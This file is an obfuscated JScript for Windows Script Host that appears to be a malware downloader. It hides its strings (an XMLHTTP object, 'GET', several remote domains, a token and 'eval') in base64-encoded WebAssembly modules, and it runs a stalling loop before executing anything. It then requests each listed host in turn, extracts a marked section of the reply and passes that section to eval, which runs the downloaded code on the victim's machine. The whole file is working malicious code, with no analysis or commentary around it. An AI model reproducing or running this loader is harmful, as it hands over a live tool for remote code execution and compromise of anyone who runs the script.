const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGo4GAgAAdfwBBAQt/AEESC38AQRgLfwBBHAt/AEEeC38AQSQLfwBBKAt/AEEsC38AQTALfwBBNAt/AEE4C38AQToLfwBBwgALfwBByAALfwBB0AALfwBB7AALfwBBhAELfwBBlAELfwBBpAELfwBBtAELfwBBqAILfwBBrgILfwBBsAILfwBBsgILfwBBtAILfwBBxAILfwBBxgILfwBByAILfwBBzAILB4WCgIAAHgZtZW1vcnkCAAVkYXRhMAMABWRhdGExAwEFZGF0YTIDAgVkYXRhMwMDBWRhdGE0AwQFZGF0YTUDBQVkYXRhNgMGBWRhdGE3AwcFZGF0YTgDCAVkYXRhOQMJBmRhdGExMAMKBmRhdGExMQMLBmRhdGExMgMMBmRhdGExMwMNBmRhdGExNAMOBmRhdGExNQMPBmRhdGExNgMQBmRhdGExNwMRBmRhdGExOAMSBmRhdGExOQMTBmRhdGEyMAMUBmRhdGEyMQMVBmRhdGEyMgMWBmRhdGEyMwMXBmRhdGEyNAMYBmRhdGEyNQMZBmRhdGEyNgMaBmRhdGEyNwMbBmRhdGEyOAMcC8aDgIAAHQBBAQsPTVNYTUwyLlhNTEhUVFAAAEESCwQlMkYAAEEYCwJ0AABBHAsBAABBHgsEJTNBAABBJAsCcAAAQSgLAmgAAEEsCwJTAABBMAsCYQAAQTQLAlQAAEE4CwEAAEE6CwdLUlVTS0EAAEHCAAsFR0VUQQAAQcgACwZodHRwUgAAQdAACxtlY29tbWVyY2UudXJiYW5kcnVsYWJzLmNvbQAAQewACxZkZW1vLnVyYmFuZHJ1bGFicy5jb20AAEGEAQsOdmFrLm1vbmRuci5ydQAAQZQBCw5rbGltYXRrcnNrLnJ1AABBpAELD2xhYm91cmZvcmNlLnJ1AABBtAELcjAwMDAwMDE2S0MzSEVpWEVNVkZxTXNSemJka3lqTEp2UVh3Nm5HM3JMWFFDOFJjcGdOanU0ZkpoNk5NZkhOaThaSWgyUVUzLUJrMFBLRzRYSE5GZGZUZDhOSDFZV2wxWTl0VldPVEQ4dnZFbk50NG0wAABBqAILBCUyRgAAQa4CCwEAAEGwAgsBAABBsgILAQAAQbQCCw4lMkZjb3VudGVyJTNGAABBxAILAQAAQcYCCwEAAEHIAgsCYQAAQcwCCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var uuu = 0;
(() => {
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return uuu < 999999 ? 1 : 0;
            },
            update: () => {
            },
            body: () => {
                {
                    uuu++;
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
var ijdl = lS(0, 0);
var pol = WScript.CreateObject(ijdl);
var jamie = [
    lS(0, 1),
    lS(0, 2),
    lS(0, 3),
    lS(0, 4),
    lS(0, 5),
    lS(0, 6),
    lS(0, 7),
    lS(0, 8),
    lS(0, 9),
    lS(0, 10),
    lS(0, 11)
];
jamie[1 + 1] = lS(0, 12);
jamie[2] = jamie[2].substr(0, 3);
var zaher = lS(0, 13);
zaher = zaher.substr(0, 4);
var x = [
    lS(0, 14),
    lS(0, 15),
    lS(0, 16),
    lS(0, 17),
    lS(0, 18)
];
var m = lS(0, 19);
var gyt = 0;
var lub = lS(0, 20);
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var ghyt = false;
        var tjkh = x[gyt + 0];
        (() => {
            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        grohot(pol, jamie[1 + 1], lS(0, 21) + zaher + lS(0, 22) + jamie[3] + lub + lS(0, 23) + lub + tjkh + lS(0, 24) + m, ghyt);
                    }
                }
            });
            const __exports = __callInstance3.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        pol.send();
                    }
                }
            });
            const __exports = __callInstance2.exports;
            return __exports.data();
        })();
        var r = pol.responseText;
        var rima = 500;
        var got = 50 + 450 + rima;
        if (r.length - 2 * got > 12 + 12 - 24 - got && r.indexOf(m) > got + 1 - 1002) {
            var dom = m;
            var amel = muhter(r, lS(0, 25) + dom + lS(0, 26));
            var jimmk = amel.join(lS(0, 27));
            (() => {
                const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                    env: {
                        impFunc: () => {
                            ataaa(jamie[9] + jimmk + jamie[9]);
                        }
                    }
                });
                const __exports = __callInstance1.exports;
                return __exports.data();
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;
function ataaa(ziyter) {
    window[lS(0, 28, true)](ziyter);
}
function muhter(kjg, lki) {
    return kjg.split(lki);
}
function grohot(hunko, b1, b2, b3) {
    (() => {
        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
            env: {
                impFunc: () => {
                    hunko.open(b1, b2, b3);
                }
            }
        });
        const __exports = __callInstance0.exports;
        return __exports.data();
    })();
}